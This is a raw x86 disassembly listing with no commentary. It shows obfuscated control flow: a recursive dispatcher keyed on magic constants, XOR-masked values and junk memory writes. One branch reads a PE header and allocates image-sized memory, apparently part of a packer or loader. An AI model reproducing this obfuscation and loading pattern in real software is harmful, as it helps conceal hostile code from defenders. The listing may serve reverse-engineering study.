  4231ad:	mov    edx,DWORD PTR [ebp-0x28]
  4231b0:	xor    ecx,edi
  4231b2:	lea    ecx,[ecx+edx*1+0x3272fa]
  4231b9:	cmp    eax,ecx
  4231bb:	jb     0x422e19
  4231c1:	mov    esi,DWORD PTR [ebp+0x14]
  4231c4:	mov    eax,DWORD PTR [ebp-0x20]
  4231c7:	mov    DWORD PTR [esi],eax
  4231c9:	jmp    0x423210
  4231cb:	mov    ecx,DWORD PTR [ebp+0x8]
  4231ce:	mov    edx,DWORD PTR [ebp+0xc]
  4231d1:	xor    ecx,edi
  4231d3:	xor    edx,edi
  4231d5:	add    ecx,ebx
  4231d7:	add    edx,ebx
  4231d9:	cmp    ecx,edx
  4231db:	jne    0x4231ef
  4231dd:	mov    eax,ds:0x7f642dde
  4231e2:	imul   eax,eax,0x9f15fcef
  4231e8:	mov    ds:0x7f642dde,eax
  4231ed:	jmp    0x423210
  4231ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4231f2:	xor    ecx,edi
  4231f4:	add    ecx,ebx
  4231f6:	cmp    eax,ecx
  4231f8:	je     0x423206
  4231fa:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  423204:	jmp    0x423210
  423206:	and    DWORD PTR ds:0x3343fade,0x5265ec3f
  423210:	pop    edi
  423211:	pop    esi
  423212:	pop    ebx
  423213:	leave  
  423214:	ret    0x18
  423217:	push   ebp
  423218:	mov    ebp,esp
  42321a:	and    esp,0xfffffff8
  42321d:	mov    eax,DWORD PTR [ebp+0x20]
  423220:	sub    esp,0x14
  423223:	push   ebx
  423224:	mov    ebx,DWORD PTR [ebp+0x14]
  423227:	push   esi
  423228:	push   edi
  423229:	cmp    eax,0xf89c85b5
  42322e:	jne    0x42323a
  423230:	push   0xf89c85b4
  423235:	jmp    0x42336c
  42323a:	mov    eax,DWORD PTR [ebp+0x20]
  42323d:	cmp    eax,0xf89c85b4
  423242:	jne    0x42324e
  423244:	push   0xf89c85bb
  423249:	jmp    0x42336c
  42324e:	mov    eax,DWORD PTR [ebp+0x20]
  423251:	cmp    eax,0xf89c85bb
  423256:	jne    0x423262
  423258:	push   0xf89c85ba
  42325d:	jmp    0x42336c
  423262:	mov    eax,DWORD PTR [ebp+0x20]
  423265:	cmp    eax,0xf89c85ba
  42326a:	jne    0x423276
  42326c:	push   0xf89c85b9
  423271:	jmp    0x42336c
  423276:	mov    ecx,DWORD PTR [ebp+0x20]
  423279:	mov    eax,0xf89c85be
  42327e:	cmp    ecx,eax
  423280:	jne    0x42333c
  423286:	mov    eax,DWORD PTR [ebp+0x10]
  423289:	mov    DWORD PTR [esp+0xc],eax
  42328d:	mov    eax,DWORD PTR [ebp+0x18]
  423290:	mov    DWORD PTR [esp+0x14],eax
  423294:	mov    eax,DWORD PTR [ebp+0xc]
  423297:	mov    DWORD PTR [esp+0x18],eax
  42329b:	mov    eax,DWORD PTR [ebp+0x8]
  42329e:	mov    DWORD PTR [esp+0x10],eax
  4232a2:	mov    eax,DWORD PTR [esp+0x10]
  4232a6:	mov    ecx,DWORD PTR [esp+0x14]
  4232aa:	mov    edi,0x75108b3
  4232af:	xor    eax,edi
  4232b1:	mov    esi,0x3272fa
  4232b6:	add    eax,esi
  4232b8:	mov    DWORD PTR [ecx],eax
  4232ba:	mov    eax,DWORD PTR [esp+0xc]
  4232be:	mov    eax,DWORD PTR [eax+0x194]
  4232c4:	mov    ecx,DWORD PTR [eax]
  4232c6:	mov    eax,DWORD PTR [esp+0xc]
  4232ca:	mov    eax,DWORD PTR [eax+0x194]
  4232d0:	mov    eax,DWORD PTR [eax]
  4232d2:	add    eax,DWORD PTR [ecx+0x3c]
  4232d5:	mov    ecx,DWORD PTR [esp+0xc]
  4232d9:	mov    ecx,DWORD PTR [ecx+0x1e0]
  4232df:	mov    ecx,DWORD PTR [ecx+0x14]
  4232e2:	push   0x4
  4232e4:	push   0x3000
  4232e9:	push   DWORD PTR [eax+0x50]
  4232ec:	push   0x0
  4232ee:	call   ecx
  4232f0:	mov    DWORD PTR [ebx],eax
  4232f2:	mov    eax,DWORD PTR [esp+0x10]
  4232f6:	push   DWORD PTR [esp+0xc]
  4232fa:	xor    eax,edi
  4232fc:	add    eax,esi
  4232fe:	mov    DWORD PTR [esp+0x20],eax
  423302:	lea    eax,[esp+0x20]
  423306:	push   eax
  423307:	push   ebx
  423308:	push   DWORD PTR [esp+0x20]
  42330c:	push   DWORD PTR [esp+0x28]
  423310:	push   DWORD PTR [esp+0x24]
  423314:	call   0x422cd9
  423319:	mov    eax,DWORD PTR [esp+0x10]
  42331d:	mov    ecx,DWORD PTR [ebx]
  42331f:	xor    eax,edi
  423321:	add    eax,esi
  423323:	cmp    ecx,eax
  423325:	je     0x423383
  423327:	mov    eax,DWORD PTR [esp+0x18]
  42332b:	mov    ecx,DWORD PTR [esp+0x14]
  42332f:	xor    eax,edi
  423331:	add    eax,esi
  423333:	imul   eax,DWORD PTR [esp+0x1c]
  423338:	mov    DWORD PTR [ecx],eax
  42333a:	jmp    0x423383
  42333c:	mov    ecx,DWORD PTR [ebp+0x20]
  42333f:	cmp    ecx,0xf89c85b9
  423345:	jne    0x42334e
  423347:	push   0xf89c85b8
  42334c:	jmp    0x42336c
  42334e:	mov    ecx,DWORD PTR [ebp+0x20]
  423351:	cmp    ecx,0xf89c85b8
  423357:	jne    0x423360
  423359:	push   0xf89c85bf
  42335e:	jmp    0x42336c
  423360:	mov    ecx,DWORD PTR [ebp+0x20]
  423363:	cmp    ecx,0xf89c85bf
  423369:	jne    0x423383
  42336b:	push   eax
  42336c:	push   DWORD PTR [ebp+0x1c]
  42336f:	push   DWORD PTR [ebp+0x18]
  423372:	push   ebx
  423373:	push   DWORD PTR [ebp+0x10]
  423376:	push   DWORD PTR [ebp+0xc]
  423379:	push   DWORD PTR [ebp+0x8]
  42337c:	call   0x423217
  423381:	mov    DWORD PTR [ebx],eax
  423383:	mov    eax,DWORD PTR [ebx]
  423385:	pop    edi
  423386:	pop    esi
  423387:	pop    ebx
  423388:	mov    esp,ebp
  42338a:	pop    ebp
  42338b:	ret    0x1c
  42338e:	push   ebp
  42338f:	mov    ebp,esp
  423391:	sub    esp,0xc
  423394:	mov    eax,0xf89c85b5
  423399:	mov    DWORD PTR [ebp-0x8],eax
  42339c:	mov    DWORD PTR [ebp-0xc],0xf89c85b4
  4233a3:	mov    ecx,DWORD PTR [ebp-0x8]
  4233a6:	xor    ecx,0x75108b3
  4233ac:	add    ecx,0x3272fa
  4233b2:	mov    DWORD PTR [ebp-0x4],ecx
  4233b5:	mov    ecx,DWORD PTR [ebp+0xc]
  4233b8:	push   eax
  4233b9:	mov    DWORD PTR [ebp+0xc],ecx
  4233bc:	push   DWORD PTR [ebp+0xc]
  4233bf:	lea    eax,[ebp-0x4]
  4233c2:	push   DWORD PTR [ebp+0x8]
  4233c5:	push   eax
  4233c6:	push   DWORD PTR [ebp+0xc]
  4233c9:	push   DWORD PTR [ebp-0xc]
  4233cc:	push   DWORD PTR [ebp-0x8]
  4233cf:	call   0x423217
  4233d4:	mov    DWORD PTR [ebp-0x4],eax
  4233d7:	mov    eax,DWORD PTR [ebp-0x4]
  4233da:	leave  
  4233db:	ret    0x8
	...
